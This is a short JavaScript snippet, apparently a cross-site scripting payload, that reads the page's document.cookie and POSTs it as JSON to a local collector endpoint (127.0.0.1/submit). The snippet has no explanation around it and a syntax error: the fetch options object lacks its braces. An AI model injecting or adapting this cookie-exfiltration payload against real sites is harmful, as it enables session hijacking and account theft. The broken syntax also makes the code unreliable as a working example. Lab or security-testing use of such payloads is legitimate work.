fetch('http://127.0.0.1/submit',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({"message": document.cookie})
).then(res => res.json()).then(res => console.log(res));
